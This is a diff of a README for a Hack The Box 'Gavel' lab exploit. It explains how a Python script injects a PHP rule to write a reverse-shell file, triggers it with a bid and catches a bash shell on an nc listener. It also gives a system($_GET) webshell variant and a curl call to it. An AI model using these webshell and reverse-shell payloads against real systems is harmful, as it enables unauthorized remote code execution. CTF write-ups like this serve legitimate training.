@@ -1,5 +1,6 @@
 # HTB "Gavel" — Automated Auction Rule → RCE Exploit
 
+**Made by [copper_nail](https://app.hackthebox.com/users/386023) aka `symphony2colour`**
 
 This repository contains an automated Python exploit for the Hack The Box machine **Gavel**.  
 It chains several application flaws to obtain a **remote shell** as the auction user:
@@ -9,20 +10,20 @@ It chains several application flaws to obtain a **remote shell** as the auction 
 - Ability to write arbitrary PHP files into `includes/`
 - Triggering a **reverse shell** via a generated PHP payload
 
-> **For CTF / lab use only.**  
+> ⚠️ **For CTF / lab use only.**  
 > This PoC is tailored for the HTB environment (`gavel.htb`) and must **not** be used against systems you don’t own or have explicit permission to test.
 
 ---
 
 ## Features
 
--  Logs in as `auctioneer` (credentials can be customized in the script)
--  Enumerates active auctions from `bidding.php`
--  Automatically picks candidate auctions based on `data-end` timestamps
--  Injects a PHP reverse shell using the admin “rule” mechanic
--  Places a bid via `bid_handler.php` to trigger the injected rule
--  Starts a `nc` listener and launches the webshell automatically
--  Randomized shell name like `shell_ab12cd34.php` for each run
+- 🔐 Logs in as `auctioneer` (credentials can be customized in the script)
+- 📜 Enumerates active auctions from `bidding.php`
+- 🧠 Automatically picks candidate auctions based on `data-end` timestamps
+- 🪄 Injects a PHP reverse shell using the admin “rule” mechanic
+- 💸 Places a bid via `bid_handler.php` to trigger the injected rule
+- 🕳️ Optionally starts a `nc` listener and fires the webshell automatically
+- 🎲 Randomized shell name like `shell_ab12cd34.php` for each run
 
 ---
 
@@ -39,55 +40,187 @@ It chains several application flaws to obtain a **remote shell** as the auction 
    username = "auctioneer"
    password = "midnight1"
    ```
-You can change these at the top of the script if needed.
 
-2. **Auction discovery**
-It fetches:
+   You can change these at the top of the script if needed.
 
-http://gavel.htb/bidding.php
+2. **Auction discovery**  
+   It fetches:
 
-then parses each auction card:
+   - `http://gavel.htb/bidding.php`
 
-Extracts auction_id
+   then parses each auction card:
 
-3. **Extracts data-end**
+   - Extracts `auction_id`
+   - Extracts `data-end` (UNIX timestamp)
+   - Extracts current bid (`Current:` value)
 
-Extracts current bid (Current: value)
+   It prefers auctions whose `data-end` is still in the future; if all appear ended, it falls back to all of them.
 
-It prefers auctions whose data-end is still in the future; if all appear ended, it falls back to all of them.
+3. **Rule injection → file write**  
+   For each candidate auction, it sends a POST to:
 
-Rule injection → file write
-For each candidate auction, it sends a POST to:
+   - `http://gavel.htb/admin.php`
 
-http://gavel.htb/admin.php
+   with a crafted **rule** like:
 
-with a crafted rule like:
+   ```php
+   file_put_contents('shell_xxx.php', '<?php ... reverse shell ... ?>'); return true;
+   ```
 
+   This writes a PHP file into the `includes/` directory with a randomized name such as `shell_ab12cd34.php`.
+
+4. **Bid trigger**  
+   It then sends a multipart/form-data POST to:
+
+   - `http://gavel.htb/includes/bid_handler.php`
+
+   with:
+
+   - `auction_id`
+   - `bid_amount` = current bid + 1
+
+   A successful bid triggers the injected rule for that auction, causing the PHP reverse shell to be written.
+
+5. **Reverse shell execution**  
+   Finally, it:
+
+   - Optionally starts a local `nc -lvnp <port>` listener
+   - Performs a GET request to:
+     `http://gavel.htb/includes/<generated_shell_name>`
+   - The PHP payload connects back to the listener with an interactive `/bin/bash -i` session.
+
+---
+
+## Requirements
+
+- Python **3.8+**
+- `requests` library
+
+Install dependencies:
+
+```bash
+pip install requests
 ```
-file_put_contents('shell_xxx.php', '<?php ... reverse shell ... ?>'); return true;
+
+---
+
+## Usage
+
+> Make sure you are connected to the **Hack The Box VPN** and can resolve `gavel.htb`.
+
+### Basic usage (with auto listener)
+
+```bash
+python3 gavel_exploit.py <LHOST> <LPORT>
 ```
 
-This writes a PHP file into the includes/ directory with a randomized name such as shell_ab12cd34.php.
+Examples:
 
-4. **Triggers a bid**
-It then sends a multipart/form-data POST to:
+```bash
+python3 gavel_exploit.py 10.10.14.70 5050
+python3 gavel_exploit.py 10.10.14.70 4444
+```
 
-http://gavel.htb/includes/bid_handler.php
+The script will:
 
-with:
+1. Log in as `auctioneer`
+2. Enumerate and display candidate auctions
+3. Inject the reverse shell rule and place bids
+4. Start `nc -lvnp <LPORT>` for you
+5. Trigger the generated shell once the listener is up
 
-auction_id
+### Without auto listener
 
-bid_amount = current bid + 1
+If you prefer to run your own listener:
 
-A successful bid triggers the injected rule for that auction, causing the PHP reverse shell to be written.
+```bash
+python3 gavel_exploit.py <LHOST> <LPORT> --no-listen
+```
 
-5. **Reverse shell execution**
-Finally, it:
+Then, in another terminal:
 
-Starts a local nc -lvnp <port> listener
+```bash
+nc -lvnp <LPORT>
+```
 
-Performs a GET request to:
-http://gavel.htb/includes/<generated_shell_name>
+The script will still:
 
-The PHP payload connects back to the listener with an interactive /bin/bash -i session.
+- Log in
+- Inject the payload
+- Place a bid
+- Trigger the reverse shell via HTTP
+
+…but will **not** start `nc` for you.
+
+---
+
+## Script arguments
+
+```text
+positional arguments:
+  ip            Your listener IP address (for reverse shell, etc.)
+  port          Your listener port (1–65535)
+
+optional arguments:
+  --no-listen   Skip auto listener (start your own nc manually)
+```
+
+Port notes:
+
+- Ports **below 1024** require root/administrator privileges.
+- Ports **above 10000** might be filtered in some environments; common good choices are `4444`, `9001`, `5050`, etc.
+
+---
+
+## Customization
+
+- **Credentials**  
+  Edit these at the top of the file if HTB changes them or you want to test another user:
+
+  ```python
+  username = "auctioneer"
+  password = "midnight1"
+  ```
+
+- **Payload type**  
+  By default, the script writes a **reverse shell** PHP file.  
+  You can switch to a classic “command via GET parameter” webshell by changing:
+
+  ```python
+  # rule = f"file_put_contents('{shell_name}','<?php system($_GET["c"]); ?>'); return true;"
+  rule = f"file_put_contents('{shell_name}','{php_code}'); return true;"
+  ```
+
+  to:
+
+  ```python
+  rule = f"file_put_contents('{shell_name}','<?php system($_GET["c"]); ?>'); return true;"
+  ```
+
+  and then call:
+
+  ```bash
+  curl "http://gavel.htb/includes/<shell_name>?c=id"
+  ```
+
+---
+
+## Legal & Ethical Notice
+
+This code is written **specifically for the Hack The Box machine "Gavel"** and is intended **only** for:
+
+- Learning  
+- CTF environments  
+- Systems you explicitly own or are authorized to test  
+
+Using this PoC against real-world infrastructure without permission is **illegal** and against the Hack The Box Terms of Service.  
+You are solely responsible for how you use this code.
+
+---
+
+## Author
+
+- **Handle:** `copper_nail` aka `symphony2colour`  
+- **Platform:** Hack The Box  
+
+If you found this useful, drop a ⭐ on the repo 🙂
